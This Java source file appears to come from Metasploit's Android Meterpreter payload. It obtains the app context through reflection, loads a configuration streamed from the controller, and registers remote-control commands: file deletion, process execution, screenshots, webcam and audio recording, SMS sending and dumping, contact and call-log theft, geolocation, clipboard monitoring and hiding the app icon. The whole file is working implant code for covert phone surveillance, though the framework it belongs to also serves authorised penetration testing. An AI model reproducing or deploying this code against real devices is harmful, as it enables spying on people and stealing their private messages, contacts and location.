package com.metasploit.meterpreter;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import com.metasploit.meterpreter.command.CommandId;
import com.metasploit.meterpreter.android.stdapi_sys_config_getuid;
import com.metasploit.meterpreter.android.stdapi_ui_desktop_screenshot;
import com.metasploit.meterpreter.android.*;
import com.metasploit.meterpreter.stdapi.*;

import com.metasploit.stage.Config;

import java.io.DataInputStream;
import java.io.File;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class AndroidMeterpreter extends Meterpreter {

    private static final Object contextWaiter = new Object();

    private static String writeableDir;
    private static Context context;

    private final IntervalCollectionManager intervalCollectionManager;
    private ClipManager clipManager;

    private void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context (running as root?)
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    synchronized (contextWaiter) {
                        try {
                            context = (Context) currentApplication.invoke(null, (Object[]) null);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        contextWaiter.notify();
                    }
                }
            });
            synchronized (contextWaiter) {
                if (context == null) {
                    contextWaiter.wait(100);
                }
            }
        }
    }

    public IntervalCollectionManager getIntervalCollectionManager() {
        return this.intervalCollectionManager;
    }

    public synchronized ClipManager getClipManager() {
        if (clipManager == null) {
            clipManager = ClipManager.create(context);
        }
        return clipManager;
    }

    public static Context getContext() {
        return context;
    }

    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, Object[] parameters, boolean redirectErrors) throws Exception {
        super(in, rawOut, true, redirectErrors, false);
        writeableDir = (String)parameters[0];
        byte[] config = (byte[]) parameters[1];

        boolean stageless = (config != null && (config[0] & Config.FLAG_STAGELESS) != 0);

        if (stageless) {
            loadConfiguration(in, rawOut, config);
        } else {
            int configLen = in.readInt();
            byte[] configBytes = new byte[configLen];
            in.readFully(configBytes);
            loadConfiguration(in, rawOut, configBytes);
            this.ignoreBlocks = in.readInt();
        }

        try {
            findContext();
        } catch (Exception e) {
            e.printStackTrace();
        }

        this.intervalCollectionManager = new IntervalCollectionManager(getContext());
        this.intervalCollectionManager.start();
        startExecuting();
        this.intervalCollectionManager.stop();
    }

    @Override
    public Integer[] loadExtension(byte[] data) throws Exception {
        getCommandManager().resetNewCommands();
        CommandManager mgr = getCommandManager();
        Loader.setCWD(new File(writeableDir));
        mgr.registerCommand(CommandId.CORE_CHANNEL_OPEN, android_channel_open.class);
        mgr.registerCommand(CommandId.STDAPI_FS_CHDIR, stdapi_fs_chdir.class);
        mgr.registerCommand(CommandId.STDAPI_FS_DELETE_DIR, stdapi_fs_delete_dir.class);
        mgr.registerCommand(CommandId.STDAPI_FS_DELETE_FILE, stdapi_fs_delete_file.class);
        mgr.registerCommand(CommandId.STDAPI_FS_FILE_EXPAND_PATH, stdapi_fs_file_expand_path_android.class);
        mgr.registerCommand(CommandId.STDAPI_FS_FILE_MOVE, stdapi_fs_file_move.class);
        mgr.registerCommand(CommandId.STDAPI_FS_FILE_COPY, stdapi_fs_file_copy.class);
        mgr.registerCommand(CommandId.STDAPI_FS_GETWD, stdapi_fs_getwd.class);
        mgr.registerCommand(CommandId.STDAPI_FS_LS, stdapi_fs_ls.class);
        mgr.registerCommand(CommandId.STDAPI_FS_MKDIR, stdapi_fs_mkdir.class);
        mgr.registerCommand(CommandId.STDAPI_FS_MD5, stdapi_fs_md5.class);
        mgr.registerCommand(CommandId.STDAPI_FS_SEARCH, stdapi_fs_search.class);
        mgr.registerCommand(CommandId.STDAPI_FS_SEPARATOR, stdapi_fs_separator.class);
        mgr.registerCommand(CommandId.STDAPI_FS_STAT, stdapi_fs_stat_V1_6.class);
        mgr.registerCommand(CommandId.STDAPI_FS_SHA1, stdapi_fs_sha1.class);
        mgr.registerCommand(CommandId.STDAPI_NET_CONFIG_GET_INTERFACES, stdapi_net_config_get_interfaces_V1_6.class);
        mgr.registerCommand(CommandId.STDAPI_NET_CONFIG_GET_ROUTES, stdapi_net_config_get_routes_V1_4.class);
        mgr.registerCommand(CommandId.STDAPI_NET_SOCKET_TCP_SHUTDOWN, stdapi_net_socket_tcp_shutdown_V1_3.class);
        mgr.registerCommand(CommandId.STDAPI_SYS_CONFIG_GETENV, stdapi_sys_config_getenv.class);
        mgr.registerCommand(CommandId.STDAPI_SYS_CONFIG_GETUID, stdapi_sys_config_getuid.class);
        mgr.registerCommand(CommandId.STDAPI_SYS_CONFIG_SYSINFO, stdapi_sys_config_sysinfo_android.class);
        mgr.registerCommand(CommandId.STDAPI_SYS_CONFIG_LOCALTIME, stdapi_sys_config_localtime.class);
        mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_EXECUTE, stdapi_sys_process_execute_V1_3.class);
        mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_CLOSE, stdapi_sys_process_close.class);
        mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_GET_PROCESSES, stdapi_sys_process_get_processes_android.class);
        mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_GETPID, stdapi_sys_process_getpid_android.class);
        mgr.registerCommand(CommandId.STDAPI_UI_DESKTOP_SCREENSHOT, stdapi_ui_desktop_screenshot.class);
        if (context != null) {
            mgr.registerCommand(CommandId.APPAPI_APP_LIST, appapi_app_list.class);
            mgr.registerCommand(CommandId.APPAPI_APP_RUN, appapi_app_run.class);
            mgr.registerCommand(CommandId.APPAPI_APP_INSTALL, appapi_app_install.class);
            mgr.registerCommand(CommandId.APPAPI_APP_UNINSTALL, appapi_app_uninstall.class);
            mgr.registerCommand(CommandId.STDAPI_WEBCAM_AUDIO_RECORD, stdapi_webcam_audio_record_android.class);
            mgr.registerCommand(CommandId.STDAPI_WEBCAM_LIST, webcam_list_android.class);
            mgr.registerCommand(CommandId.STDAPI_WEBCAM_START, webcam_start_android.class);
            mgr.registerCommand(CommandId.STDAPI_WEBCAM_STOP, webcam_stop_android.class);
            mgr.registerCommand(CommandId.STDAPI_WEBCAM_GET_FRAME, webcam_get_frame_android.class);
            mgr.registerCommand(CommandId.ANDROID_SEND_SMS, android_send_sms.class);
            mgr.registerCommand(CommandId.ANDROID_DUMP_SMS, android_dump_sms.class);
            mgr.registerCommand(CommandId.ANDROID_DUMP_CONTACTS, android_dump_contacts.class);
            mgr.registerCommand(CommandId.ANDROID_DUMP_CALLLOG, android_dump_calllog.class);
            mgr.registerCommand(CommandId.ANDROID_CHECK_ROOT, android_check_root.class);
            mgr.registerCommand(CommandId.ANDROID_GEOLOCATE, android_geolocate.class);
            mgr.registerCommand(CommandId.ANDROID_WLAN_GEOLOCATE, android_wlan_geolocate.class);
            mgr.registerCommand(CommandId.ANDROID_INTERVAL_COLLECT, android_interval_collect.class);
            mgr.registerCommand(CommandId.ANDROID_ACTIVITY_START, android_activity_start.class);
            mgr.registerCommand(CommandId.ANDROID_HIDE_APP_ICON, android_hide_app_icon.class);
            mgr.registerCommand(CommandId.ANDROID_SET_AUDIO_MODE, android_set_audio_mode.class);
            mgr.registerCommand(CommandId.ANDROID_SQLITE_QUERY, android_sqlite_query.class);
            mgr.registerCommand(CommandId.ANDROID_WAKELOCK, android_wakelock.class);
            mgr.registerCommand(CommandId.ANDROID_SET_WALLPAPER, android_set_wallpaper.class);
            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_GET_DATA, clipboard_get_data.class);
            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_SET_DATA, clipboard_set_data.class);
            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_DUMP, clipboard_monitor_dump.class);
            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_PAUSE, clipboard_monitor_pause.class);
            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_PURGE, clipboard_monitor_purge.class);
            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_RESUME, clipboard_monitor_resume.class);
            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_START, clipboard_monitor_start.class);
            mgr.registerCommand(CommandId.EXTAPI_CLIPBOARD_MONITOR_STOP, clipboard_monitor_stop.class);
        }
        return getCommandManager().getNewCommandIds();
    }
}
